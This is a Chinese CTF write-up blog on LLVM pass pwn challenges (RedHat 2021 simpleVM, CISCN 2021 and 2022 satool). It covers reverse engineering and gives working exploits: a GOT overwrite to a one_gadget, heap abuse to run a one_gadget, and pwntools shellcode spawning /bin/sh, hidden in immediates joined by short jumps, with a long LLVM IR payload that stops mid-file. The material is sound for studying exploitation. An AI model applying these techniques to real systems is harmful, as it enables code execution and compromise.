# LLVM_PASS_PWN_学习




本文主要记录一下llvm pass pwn的学习过程。

## 前言

首先我们要了解一下llvm pass和llvm IR。

可参考以下内容： https://llvm.org/docs/WritingAnLLVMPass.html      （官方的hello world pass介绍）

https://zhuanlan.zhihu.com/p/392381317   （上手官方文档 Hello Pass）

 https://evian-zhang.github.io/llvm-ir-tutorial/index.html      （llvm IR入门指南，介绍IR的基础语法）

阅读完以上内容后，对llvm pass和IR有了一定的认识，接下来就可以进行做题了。

## 准备工作

通过题目给出的opt版本下载对应的llvm和clang

```bash
sudo apt install llvm-version
sudo apt install clang-version
```

使用opt同版本的clang 生成ll或bc文件 ，如题目给出的为opt-8，则使用以下命令

```bash
clang-8 -emit-llvm -S exp.c -o exp.ll
```

此外题目还会给出一个llvm pass模块，我们需要使用IDA打开该`****.so`文件，对其进行分析发现漏洞点。

然后使用`./opt-version -load ./****.so -PASS_name ./exp.{ll/bc}`（PASS_name 可见readme文档或逆向分析）命令加载模块并启动`LLVM`的优化分析。

题目中常见的llvm语法可阅读[winmt师傅的文章](https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_1)：

![image-20230715111517021](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352726.png)

也可参考官方文档https://releases.llvm.org/2.0/docs/ProgrammersManual.html、https://llvm.org/doxygen/classllvm_1_1User.html（问gpt也很方便）

调试命令如下：

```bash
gdb ./opt
b main 
set args -load ./xxxx.so -xxxx ./exp.ll #设置参数
```

![image-20230715120124320](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352493.png)

`opt`并不会一开始就将`so`模块加载进来，而是在`call`了一堆`llvm`初始化相关函数后才会加载`so`模块

![image-20230715120506104](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352494.png)

如下所示，LLVMHello.so加载成功

![image-20230715120625662](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352495.png)

![image-20230715120651488](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352496.png)

然后使用LLVMHello.so的基地址加上对应`so`模块中的汇编指令偏移就即可下断点。

## 红帽杯-2021 simpleVM

题目链接：https://github.com/Hornos3/pwnfile/tree/master/LLVM/challenges/RedHat2021-simpleVM

IDA 打开.so 文件，alt+T 搜索vtable

![image-20230718220615070](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352497.png)

重写的`runOnFunction`函数是`sub_6830`

![image-20230718220643612](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352498.png)

### 函数分析

![image-20230718220714322](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352499.png)

可以得出pass名为VMPass，接下来分析`sub_6830`函数

![image-20230718220920321](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352500.png)

首先判断函数名称是否为`o0o0o0o0`，若是，则进入`sub_6AC0`函数

![image-20230718221307597](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352501.png)

`sub_6AC0`函数会遍历函数内部所有的`basicblock`，并将`basicblock`传递到`sub_6B80`函数

![image-20230718223657200](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352502.png)

在`sub_6B80`函数中，程序会遍历`basicblock`中的每条指令，然后匹配指令名，根据结果以及指令参数情况来决定做什么操作。

>  查看本机的`/usr/include/llvm-8/llvm/IR/Instruction.def`，发现llvm-8中，call对应的操作符号为55

![image-20230718221638961](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352503.png)



push和pop分析

程序定义了几个变量来模拟栈：reg1（off_20DFD0 中存储的是reg1的地址），reg2（off_20DFC0 中存储的是reg2的地址），stack（off_20DFD8 存储的是 stack 的地址），然后模拟出pop、push的操作：pop就是将栈中的值给寄存器，然后stack-8，push就是将寄存器中的值赋给栈，然后stack+8

![image-20230718224244605](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352504.png)

![image-20230718224253357](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352505.png)

store 和load函数

![image-20230718225432871](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352506.png)

![image-20230718230708019](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352507.png)

add和min函数使得寄存器加或减去一个值

![image-20230718225709247](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352508.png)

### 漏洞利用

通过上面对函数的分析，函数的漏洞利用就很明显了

- 利用add函数使得reg2的值为free_got
- 利用load 指令读取 free_got中的值赋给reg1
- 利用add函数 使reg1的值加上one_gadget 距离 free 的偏移得到one_gadget
- 利用store 函数，将free_got 修改为one_gadget 
- 退出获取shell

### exp

测试环境为`Ubuntu 18.04`，对应`GLIBC 2.27-3ubuntu1.6`版本，`exp`如下

```c
//free_got 077E100 
//one_gadget-free=0x729ec 
void o0o0o0o0();
void pop(int reg_index);
void push(int reg_index);
void store(int reg_index);
void load(int reg_index);
void add(int reg_index,int value);
void min(int reg_index,int value);
void o0o0o0o0(){
	add(2,0x077E100);
	load(2);
	add(1,0x729ec);
	store(2);
}
```

![image-20230718234953759](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352509.png)

## CISCN-2021 satool

![image-20230720103034377](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352510.png)

![image-20230720102550344](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352511.png)

可以得出pass名为SAPass，重写的`runOnFunction`函数为`sub_19D0`

### 函数分析

反编译后的函数比较杂乱，和之前相比很难看懂，这里我们只关注函数的关键操作。

![image-20230720103201382](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352512.png)

首先函数会判断这函数的名字是否为`B4ckDo0r`，如果不是，则会直接退出。要想进行下面的处理，我们就必须要让一个函数的名字为`B4ckDo0r`。

通过调试，可以知道`if ( !(unsigned int)std::string::compare(&v89, "save") )`这类语句都是判断是否在`B4ckDo0r`中调用了某个函数（如`save()`），并对其进行一系列操作。此外，如`-1431655765 * (unsigned int)((unsigned __int64)((char *)&v15[3 * v18 + -3 * NumTotalBundleOperands] - v20) >> 3) == 2`这类语句的左侧就是取调用的这个函数的参数个数。

save函数的关键操作如下：

![image-20230720104900238](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352513.png)

v25是save的一参，v30是save的二参，malloc 分配一个chunk，并将v25和v30通过memcpy赋给chunk的data。

takeaway的关键操作如下

![image-20230720105239699](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352514.png)

![image-20230720105132450](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352515.png)

释放chunkptr指向的chunk，并使chunk ptr指向chunk ptr[2]中指向的chunk。

stealkey的关键操作如下：

![image-20230720105359706](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352516.png)

使byte_204100的值等于 chunk_ptr 指向chunk 的data值（即chunk fd位置存储的值）

fakekey的关键操作如下：

![image-20230720105503270](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352517.png)

使byte_204100等于byte_204100 加上fakekey的参数，然后并将byte_204100的值赋给chunk_ptr 指向chunk 的data（即chunk fd位置存储的值）

run的关键操作如下：

![image-20230720105635230](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352519.png)

将chunk ptr指向chunk中的值作为函数指针直接执行。

这里引用一下[blackbird](http://www.blackbird.wang/2022/08/30/LLVM-PASS%E7%B1%BBpwn%E9%A2%98%E6%80%BB%E7%BB%93/)师傅的总结分析，得出各个函数的重要功能如下

![image-20230720105824672](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352520.png)

### 漏洞利用

在我们执行到`sub_19D0`函数时，程序中含有许多bins，

![image-20230720110132267](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352521.png)

我们利用save在清空tcache后即可申请到unsorted bin，此时我们设置save的第一个参数为空，即可保留该`chunk`的`fd`为`main_arena+96`，如此便可得到libc地址。

利用stealkey将`main_arena+96`存储在`byte_204100`

利用fakekey使`byte_204100`加上其距离one_gadget 的偏移，使chunk的fd为one_gadget

利用run执行one_gadget 获取shell

### exp

测试环境为`Ubuntu 18.04`，对应`GLIBC 2.27-3ubuntu1.6`版本，`exp`如下

```python
//main_arena-onegadget=-0x39c9ae
void save(char *a,char *b){}
void takeaway(){}
void stealkey(){}
void fakekey(int a){}
void run(){}
void B4ckDo0r(){
	save("","");//0
	save("","");//1
	save("","");//2
	save("","");//3
	save("","");//4
	save("","");//5
	save("","");//6
	save("","");//7
	stealkey();
	fakekey(-0x39c9ae);
	run();
}
```

![image-20230720110801641](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352522.png)

## CISCN-2022 satool

前言：本题主要参考了[winmt](https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9) 师傅的博客，也可以说是复制了。

pass名为mba，题目没有去除符号表，重写的`runOnFunction`函数为``anonymous namespace'::MBAPass::runOnFunction`

可以看到，首先代码设置this[4] 为可读可写，经过handle函数的处理，设置其为可读可执行，然后执行this[4]处的代码，接下来就对handle函数进行分析

![image-20240108174112130](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352523.png)

handle函数中倒序对基本块中的指令进行处理的，第一个是if判断指令的第一个操作数是否是常量，第二个if判断指令判断第一个操作数是否为函数的参数，如果都不是，则为变量，进入else 语句中

![image-20240108190814128](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352524.png)

总结一下可以向this[4] 中写入汇编指令的函数：

- writeMovImm64：`writeMovImm64(this, 0, val)`是写入`movabs rax, val`指令，`writeMovImm64(this, 1, val)`是写入`movabs rbx, val`指令，其中`val`可以是八字节数，共十字节
  ![image-20240108192124678](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352525.png)

- writeRet：写入`ret`指令，一字节
  ![image-20240108192641192](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352526.png)

- writeInc：`writeInc(this, 1)`是写入`inc rax`指令 ，`writeInc(this, -1)`是写入`dec rax`指令，三字节

  ![image-20240108192431166](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352527.png)

- writeOpReg：`writeOpReg(this, 1)`是写入`add rax，rbx`指令，`writeOpReg(this, -1)`是写入`sub rax，rbx`指令，三字节

  ![image-20240108192841464](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352528.png)

在else 循环中，首先向this[4] 中写入movabs rax,0指令，然后创建两个c++ stl的stack：一个是 `std::stack<llvm::Value *>` 类型的 stack1，初始值为最后一条指令的第一个操作数，另一个是 `std::stack<int>` 类型的 stack2，用于判断正负，其初始值为1。

进入while循环，判断this[5]<this[4]+0xff0, 也就是当写入的汇编指令长度大于`0xff0`就会退出循环，或者当`stack1`的栈为空时，会写入一个`ret`指令，然后跳转循环。

while 循环中，会弹出这两个栈的栈顶元素stack1_top、stack2_top，通过stack1_top得到我们编写的llvm IR中对应的指令，判断其是否为add 或者sub，不是则exit。

如果操作符为sub，接着取当前指令的第一个参数和第二个参数，如果第一个参数是常数，如果是±1 ，则根据`stack2_top*val`选择写入`inc rax` 或者`dec rax`指令，如果是其它常数，写入 `movabs rbx，val，add rax，rbx`指令，如果第一个参数为变量，则分别将第一个参数压入压入stack1，将stack2_top压入stack2中

对第二个参数和第一个参数的判断相同。

如果操作符是`sub`，那么就将从`stack2`栈顶取出的数`stack2_top`取反，然后再执行一遍上述过程，这样之后加上第二个操作数`val`乘上`stack2_top`的结果就相当于减去`val`了。

本题的漏洞点在于，程序开辟了0x1000长度的可执行段，程序对写入指令的判断仅限于this[5]<this[4]+0xff0，那么我们可以在最后一次while 循环中写入一个较长的指令，那么最后指令长度就会大于0xff0，让超过的几个字节中存在某个跳转指令。然后进行第二次的指令写入，这次我们让写入的指令恰好长度为0xff0，那么就会执行我们上一次写入的跳转指令。

这里利用`jmp short offset` 进行跳转（-128<offset <127),`jmp short`对应的机器码是`0xEB`，后面再加上一个字节的偏移（负数用补码）即可，一个短跳转指令共两个字节。

那么应该跳转到哪里呢？注意到mov rax/rbx, val 中的val 是可控的，于是我们可以在val写入一行行的`shellcode`，并用`nop`空指令补全六位以后，在之后写上两个字节的短跳转指令，跳转到下一行`shellcode`即可，这样就能顺利地执行到任意`shellcode`了。

这里写shellcode 脚本也是复制winmt师傅的

```python
from pwn import*
context(os = 'linux', arch = 'amd64')#,log_level='debug')
 
shellcode = [
    "mov edi, 0x68732f6e",
    "shl rdi, 24",
    "mov ebx, 0x69622f",
    "add rdi, rbx",
    "push rdi",
    "push rsp",
    "pop rdi",
    "xor rsi, rsi",
    "xor rdx, rdx",
    "push 59",
    "pop rax",
    "syscall"
]


for sc in shellcode:
    print(u64(asm(sc).ljust(6, b'\x90') +asm("jmp $-19")))  //8+3+2+6=19
print(u16(asm("jmp $-50")))                                 //13+13+13+3+8=50
```

开头使用了movabs rax,0指令，占用0xa字节，3条inc 指令占用0xc指令，312条 `mov rbx,val  add rax，rbx`占用了`312*13=0xFD8`字节,总共占用`0xFEE`,那么我们在写一次`mov rbx,val  add rax，rbx`指令,那么此时val 正好位于`0xff0`处，也就是我们要设置的`jmp short offset` 指令

![image-20240108203655401](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352529.png)

> 需要注意handle 是逆序处理我们编写的llvm IR 的

接下来再编写的IR使写入的指令恰好为0xff0，即`10+3*9+311*13=0xff0`，  %2 = add nsw i64 1024,1024  会写入两次`mov rbx,val  add rax，rbx`指令。

由于这题的`LLVM IR`中指令的操作符只能是`add`或`sub`，故不能用`C`语言直接编译生成`LLVM IR`文件，不然会有很多其他的操作符。所以可以先用`C`语言写两个空函数，再通过`clang-12`对其编译生成`ll`文件，然后直接在`ll`文件中仿照之前的题目手写`LLVM IR`即可。

### exp

```python
; ModuleID = 'exp.c'
source_filename = "exp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @func1(i64 %0) #0 {
  %2 = add nsw i64 %0, 52459
  %3 = add nsw i64 %2, 4096
  %4 = add nsw i64 %3, 4096
  %5 = add nsw i64 %4, 4096
  %6 = add nsw i64 %5, 4096
  %7 = add nsw i64 %6, 4096
  %8 = add nsw i64 %7, 4096
  %9 = add nsw i64 %8, 4096
  %10 = add nsw i64 %9, 4096
  %11 = add nsw i64 %10, 4096
  %12 = add nsw i64 %11, 4096
  %13 = add nsw i64 %12, 4096
  %14 = add nsw i64 %13, 4096
  %15 = add nsw i64 %14, 4096
  %16 = add nsw i64 %15, 4096
  %17 = add nsw i64 %16, 4096
  %18 = add nsw i64 %17, 4096
  %19 = add nsw i64 %18, 4096
  %20 = add nsw i64 %19, 4096
  %21 = add nsw i64 %20, 4096
  %22 = add nsw i64 %21, 4096
  %23 = add nsw i64 %22, 4096
  %24 = add nsw i64 %23, 4096
  %25 = add nsw i64 %24, 4096
  %26 = add nsw i64 %25, 4096
  %27 = add nsw i64 %26, 4096
  %28 = add nsw i64 %27, 4096
  %29 = add nsw i64 %28, 4096
  %30 = add nsw i64 %29, 4096
  %31 = add nsw i64 %30, 4096
  %32 = add nsw i64 %31, 4096
  %33 = add nsw i64 %32, 4096
  %34 = add nsw i64 %33, 4096
  %35 = add nsw i64 %34, 4096
  %36 = add nsw i64 %35, 4096
  %37 = add nsw i64 %36, 4096
  %38 = add nsw i64 %37, 4096
  %39 = add nsw i64 %38, 4096
  %40 = add nsw i64 %39, 4096
  %41 = add nsw i64 %40, 4096
  %42 = add nsw i64 %41, 4096
  %43 = add nsw i64 %42, 4096
  %44 = add nsw i64 %43, 4096
  %45 = add nsw i64 %44, 4096
  %46 = add nsw i64 %45, 4096
  %47 = add nsw i64 %46, 4096
  %48 = add nsw i64 %47, 4096
  %49 = add nsw i64 %48, 4096
  %50 = add nsw i64 %49, 4096
  %51 = add nsw i64 %50, 4096
  %52 = add nsw i64 %51, 4096
  %53 = add nsw i64 %52, 4096
  %54 = add nsw i64 %53, 4096
  %55 = add nsw i64 %54, 4096
  %56 = add nsw i64 %55, 4096
  %57 = add nsw i64 %56, 4096
  %58 = add nsw i64 %57, 4096
  %59 = add nsw i64 %58, 4096
  %60 = add nsw i64 %59, 4096
  %61 = add nsw i64 %60, 4096
  %62 = add nsw i64 %61, 4096
  %63 = add nsw i64 %62, 4096
  %64 = add nsw i64 %63, 4096
  %65 = add nsw i64 %64, 4096
  %66 = add nsw i64 %65, 4096
  %67 = add nsw i64 %66, 4096
  %68 = add nsw i64 %67, 4096
  %69 = add nsw i64 %68, 4096
  %70 = add nsw i64 %69, 4096
  %71 = add nsw i64 %70, 4096
  %72 = add nsw i64 %71, 4096
  %73 = add nsw i64 %72, 4096
  %74 = add nsw i64 %73, 4096
  %75 = add nsw i64 %74, 4096
  %76 = add nsw i64 %75, 4096
  %77 = add nsw i64 %76, 4096
  %78 = add nsw i64 %77, 4096
  %79 = add nsw i64 %78, 4096
  %80 = add nsw i64 %79, 4096
  %81 = add nsw i64 %80, 4096
  %82 = add nsw i64 %81, 4096
  %83 = add nsw i64 %82, 4096
  %84 = add nsw i64 %83, 4096
  %85 = add nsw i64 %84, 4096
  %86 = add nsw i64 %85, 4096
  %87 = add nsw i64 %86, 4096
  %88 = add nsw i64 %87, 4096
  %89 = add nsw i64 %88, 4096
  %90 = add nsw i64 %89, 4096
  %91 = add nsw i64 %90, 4096
  %92 = add nsw i64 %91, 4096
  %93 = add nsw i64 %92, 4096
  %94 = add nsw i64 %93, 4096
  %95 = add nsw i64 %94, 4096
  %96 = add nsw i64 %95, 4096
  %97 = add nsw i64 %96, 4096
  %98 = add nsw i64 %97, 4096
  %99 = add nsw i64 %98, 4096
  %100 = add nsw i64 %99, 4096
  %101 = add nsw i64 %100, 4096
  %102 = add nsw i64 %101, 4096
  %103 = add nsw i64 %102, 4096
  %104 = add nsw i64 %103, 4096
  %105 = add nsw i64 %104, 4096
  %106 = add nsw i64 %105, 4096
  %107 = add nsw i64 %106, 4096
  %108 = add nsw i64 %107, 4096
  %109 = add nsw i64 %108, 4096
  %110 = add nsw i64 %109, 4096
  %111 = add nsw i64 %110, 4096
  %112 = add nsw i64 %111, 4096
  %113 = add nsw i64 %112, 4096
  %114 = add nsw i64 %113, 4096
  %115 = add nsw i64 %114, 4096
  %116 = add nsw i64 %115, 4096
  %117 = add nsw i64 %116, 4096
  %118 = add nsw i64 %117, 4096
  %119 = add nsw i64 %118, 4096
  %120 = add nsw i64 %119, 4096
  %121 = add nsw i64 %120, 4096
  %122 = add nsw i64 %121, 4096
  %123 = add nsw i64 %122, 4096
  %124 = add nsw i64 %123, 4096
  %125 = add nsw i64 %124, 4096
  %126 = add nsw i64 %125, 4096
  %127 = add nsw i64 %126, 4096
  %128 = add nsw i64 %127, 4096
  %129 = add nsw i64 %128, 4096
  %130 = add nsw i64 %129, 4096
  %131 = add nsw i64 %130, 4096
  %132 = add nsw i64 %131, 4096
  %133 = add nsw i64 %132, 4096
  %134 = add nsw i64 %133, 4096
  %135 = add nsw i64 %134, 4096
  %136 = add nsw i64 %135, 4096
  %137 = add nsw i64 %136, 4096
  %138 = add nsw i64 %137, 4096
  %139 = add nsw i64 %138, 4096
  %140 = add nsw i64 %139, 4096
  %141 = add nsw i64 %140, 4096
  %142 = add nsw i64 %141, 4096
  %143 = add nsw i64 %142, 4096
  %144 = add nsw i64 %143, 4096
  %145 = add nsw i64 %144, 4096
  %146 = add nsw i64 %145, 4096
  %147 = add nsw i64 %146, 4096
  %148 = add nsw i64 %147, 4096
  %149 = add nsw i64 %148, 4096
  %150 = add nsw i64 %149, 4096
  %151 = add nsw i64 %150, 4096
  %152 = add nsw i64 %151, 4096
  %153 = add nsw i64 %152, 4096
  %154 = add nsw i64 %153, 4096
  %155 = add nsw i64 %154, 4096
  %156 = add nsw i64 %155, 4096
  %157 = add nsw i64 %156, 4096
  %158 = add nsw i64 %157, 4096
  %159 = add nsw i64 %158, 4096
  %160 = add nsw i64 %159, 4096
  %161 = add nsw i64 %160, 4096
  %162 = add nsw i64 %161, 4096
  %163 = add nsw i64 %162, 4096
  %164 = add nsw i64 %163, 4096
  %165 = add nsw i64 %164, 4096
  %166 = add nsw i64 %165, 4096
  %167 = add nsw i64 %166, 4096
  %168 = add nsw i64 %167, 4096
  %169 = add nsw i64 %168, 4096
  %170 = add nsw i64 %169, 4096
  %171 = add nsw i64 %170, 4096
  %172 = add nsw i64 %171, 4096
  %173 = add nsw i64 %172, 4096
  %174 = add nsw i64 %173, 4096
  %175 = add nsw i64 %174, 4096
  %176 = add nsw i64 %175, 4096
  %177 = add nsw i64 %176, 4096
  %178 = add nsw i64 %177, 4096
  %179 = add nsw i64 %178, 4096
  %180 = add nsw i64 %179, 4096
  %181 = add nsw i64 %180, 4096
  %182 = add nsw i64 %181, 4096
  %183 = add nsw i64 %182, 4096
  %184 = add nsw i64 %183, 4096
  %185 = add nsw i64 %184, 4096
  %186 = add nsw i64 %185, 4096
  %187 = add nsw i64 %186, 4096
  %188 = add nsw i64 %187, 4096
  %189 = add nsw i64 %188, 4096
  %190 = add nsw i64 %189, 4096
  %191 = add nsw i64 %190, 4096
  %192 = add nsw i64 %191, 4096
  %193 = add nsw i64 %192, 4096
  %194 = add nsw i64 %193, 4096
  %195 = add nsw i64 %194, 4096
  %196 = add nsw i64 %195, 4096
  %197 = add nsw i64 %196, 4096
  %198 = add nsw i64 %197, 4096
  %199 = add nsw i64 %198, 4096
  %200 = add nsw i64 %199, 4096
  %201 = add nsw i64 %200, 4096
  %202 = add nsw i64 %201, 4096
  %203 = add nsw i64 %202, 4096
  %204 = add nsw i64 %203, 4096
  %205 = add nsw i64 %204, 4096
  %206 = add nsw i64 %205, 4096
  %207 = add nsw i64 %206, 4096
  %208 = add nsw i64 %207, 4096
  %209 = add nsw i64 %208, 4096
  %210 = add nsw i64 %209, 4096
  %211 = add nsw i64 %210, 4096
  %212 = add nsw i64 %211, 4096
  %213 = add nsw i64 %212, 4096
  %214 = add nsw i64 %213, 4096
  %215 = add nsw i64 %214, 4096
  %216 = add nsw i64 %215, 4096
  %217 = add nsw i64 %216, 4096
  %218 = add nsw i64 %217, 4096
  %219 = add nsw i64 %218, 4096
  %220 = add nsw i64 %219, 4096
  %221 = add nsw i64 %220, 4096
  %222 = add nsw i64 %221, 4096
  %223 = add nsw i64 %222, 4096
  %224 = add nsw i64 %223, 4096
  %225 = add nsw i64 %224, 4096
  %226 = add nsw i64 %225, 4096
  %227 = add nsw i64 %226, 4096
  %228 = add nsw i64 %227, 4096
  %229 = add nsw i64 %228, 4096
  %230 = add nsw i64 %229, 4096
  %231 = add nsw i64 %230, 4096
  %232 = add nsw i64 %231, 4096
  %233 = add nsw i64 %232, 4096
  %234 = add nsw i64 %233, 4096
  %235 = add nsw i64 %234, 4096
  %236 = add nsw i64 %235, 4096
  %237 = add nsw i64 %236, 4096
  %238 = add nsw i64 %237, 4096
  %239 = add nsw i64 %238, 4096
  %240 = add nsw i64 %239, 4096
  %241 = add nsw i64 %240, 4096
  %242 = add nsw i64 %241, 4096
  %243 = add nsw i64 %242, 4096
  %244 = add nsw i64 %243, 4096
  %245 = add nsw i64 %244, 4096
  %246 = add nsw i64 %245, 4096
  %247 = add nsw i64 %246, 4096
  %248 = add nsw i64 %247, 4096
  %249 = add nsw i64 %248, 4096
  %250 = add nsw i64 %249, 4096
  %251 = add nsw i64 %250, 4096
  %252 = add nsw i64 %251, 4096
  %253 = add nsw i64 %252, 4096
  %254 = add nsw i64 %253, 4096
  %255 = add nsw i64 %254, 4096
  %256 = add nsw i64 %255, 4096
  %257 = add nsw i64 %256, 4096
  %258 = add nsw i64 %257, 4096
  %259 = add nsw i64 %258, 4096
  %260 = add nsw i64 %259, 4096
  %261 = add nsw i64 %260, 4096
  %262 = add nsw i64 %261, 4096
  %263 = add nsw i64 %262, 4096
  %264 = add nsw i64 %263, 4096
  %265 = add nsw i64 %264, 4096
  %266 = add nsw i64 %265, 4096
  %267 = add nsw i64 %266, 4096
  %268 = add nsw i64 %267, 4096
  %269 = add nsw i64 %268, 4096
  %270 = add nsw i64 %269, 4096
  %271 = add nsw i64 %270, 4096
  %272 = add nsw i64 %271, 4096
  %273 = add nsw i64 %272, 4096
  %274 = add nsw i64 %273, 4096
  %275 = add nsw i64 %274, 4096
  %276 = add nsw i64 %275, 4096
  %277 = add nsw i64 %276, 4096
  %278 = add nsw i64 %277, 4096
  %279 = add nsw i64 %278, 4096
  %280 = add nsw i64 %279, 4096
  %281 = add nsw i64 %280, 4096
  %282 = add nsw i64 %281, 4096
  %283 = add nsw i64 %282, 4096
  %284 = add nsw i64 %283, 4096
  %285 = add nsw i64 %284, 4096
  %286 = add nsw i64 %285, 4096
  %287 = add nsw i64 %286, 4096
  %288 = add nsw i64 %287, 4096
  %289 = add nsw i64 %288, 4096
  %290 = add nsw i64 %289, 4096
  %291 = add nsw i64 %290, 4096
  %292 = add nsw i64 %291, 4096
  %293 = add nsw i64 %292, 4096
  %294 = add nsw i64 %293, 4096
  %295 = add nsw i64 %294, 4096
  %296 = add nsw i64 %295, 4096
  %297 = add nsw i64 %296, 4096
  %298 = add nsw i64 %297, 4096
  %299 = add nsw i64 %298, 4096
  %300 = add nsw i64 %299, 4096
  %301 = add nsw i64 %300, 4096
  %302 = add nsw i64 %301, 4096
  %303 = add nsw i64 %302, 4096
  %304 = add nsw i64 %303, 4096
  %305 = add nsw i64 %304, 4096
  %306 = add nsw i64 %305, 4096
  %307 = add nsw i64 %306, 4096
  %308 = add nsw i64 %307, 4096
  %309 = add nsw i64 %308, 4096
  %310 = add nsw i64 %309, 4096
  %311 = add nsw i64 %310, 4096
  %312 = add nsw i64 %311, 4096
  %313 = add nsw i64 %312, 4096
  %314 = add nsw i64 %313, 4096
  %315 = add nsw i64 %314, 1
  %316 = add nsw i64 %315, 1
  %317 = add nsw i64 %316, 1
  %318 = add nsw i64 %317, 1
  ret i64 %318
}

define dso_local i64 @func2(i64 %0) #0 {
  %2 = add nsw i64 1024,1024 
  %3 = add nsw i64 %2, 1024
  %4 = add nsw i64 %3, 16999839996723556031
  %5 = add nsw i64 %4, 16999840167007600968
  %6 = add nsw i64 %5, 16999839549882511291
  %7 = add nsw i64 %6, 16999840169020293448
  %8 = add nsw i64 %7, 16999840169015152727
  %9 = add nsw i64 %8, 16999840169015152724
  %10 = add nsw i64 %9, 16999840169015152735
  %11 = add nsw i64 %10, 16999840169021813064
  %12 = add nsw i64 %11, 16999840169019453768
  %13 = add nsw i64 %12, 16999840169015130986
  %14 = add nsw i64 %13, 16999840169015152728
  %15 = add nsw i64 %14, 16999840169015117071
  %16 = add nsw i64 %15, 4096
  %17 = add nsw i64 %16, 4096
  %18 = add nsw i64 %17, 4096
  %19 = add nsw i64 %18, 4096
  %20 = add nsw i64 %19, 4096
  %21 = add nsw i64 %20, 4096
  %22 = add nsw i64 %21, 4096
  %23 = add nsw i64 %22, 4096
  %24 = add nsw i64 %23, 4096
  %25 = add nsw i64 %24, 4096
  %26 = add nsw i64 %25, 4096
  %27 = add nsw i64 %26, 4096
  %28 = add nsw i64 %27, 4096
  %29 = add nsw i64 %28, 4096
  %30 = add nsw i64 %29, 4096
  %31 = add nsw i64 %30, 4096
  %32 = add nsw i64 %31, 4096
  %33 = add nsw i64 %32, 4096
  %34 = add nsw i64 %33, 4096
  %35 = add nsw i64 %34, 4096
  %36 = add nsw i64 %35, 4096
  %37 = add nsw i64 %36, 4096
  %38 = add nsw i64 %37, 4096
  %39 = add nsw i64 %38, 4096
  %40 = add nsw i64 %39, 4096
  %41 = add nsw i64 %40, 4096
  %42 = add nsw i64 %41, 4096
  %43 = add nsw i64 %42, 4096
  %44 = add nsw i64 %43, 4096
  %45 = add nsw i64 %44, 4096
  %46 = add nsw i64 %45, 4096
  %47 = add nsw i64 %46, 4096
  %48 = add nsw i64 %47, 4096
  %49 = add nsw i64 %48, 4096
  %50 = add nsw i64 %49, 4096
  %51 = add nsw i64 %50, 4096
  %52 = add nsw i64 %51, 4096
  %53 = add nsw i64 %52, 4096
  %54 = add nsw i64 %53, 4096
  %55 = add nsw i64 %54, 4096
  %56 = add nsw i64 %55, 4096
  %57 = add nsw i64 %56, 4096
  %58 = add nsw i64 %57, 4096
  %59 = add nsw i64 %58, 4096
  %60 = add nsw i64 %59, 4096
  %61 = add nsw i64 %60, 4096
  %62 = add nsw i64 %61, 4096
  %63 = add nsw i64 %62, 4096
  %64 = add nsw i64 %63, 4096
  %65 = add nsw i64 %64, 4096
  %66 = add nsw i64 %65, 4096
  %67 = add nsw i64 %66, 4096
  %68 = add nsw i64 %67, 4096
  %69 = add nsw i64 %68, 4096
  %70 = add nsw i64 %69, 4096
  %71 = add nsw i64 %70, 4096
  %72 = add nsw i64 %71, 4096
  %73 = add nsw i64 %72, 4096
  %74 = add nsw i64 %73, 4096
  %75 = add nsw i64 %74, 4096
  %76 = add nsw i64 %75, 4096
  %77 = add nsw i64 %76, 4096
  %78 = add nsw i64 %77, 4096
  %79 = add nsw i64 %78, 4096
  %80 = add nsw i64 %79, 4096
  %81 = add nsw i64 %80, 4096
  %82 = add nsw i64 %81, 4096
  %83 = add nsw i64 %82, 4096
  %84 = add nsw i64 %83, 4096
  %85 = add nsw i64 %84, 4096
  %86 = add nsw i64 %85, 4096
  %87 = add nsw i64 %86, 4096
  %88 = add nsw i64 %87, 4096
  %89 = add nsw i64 %88, 4096
  %90 = add nsw i64 %89, 4096
  %91 = add nsw i64 %90, 4096
  %92 = add nsw i64 %91, 4096
  %93 = add nsw i64 %92, 4096
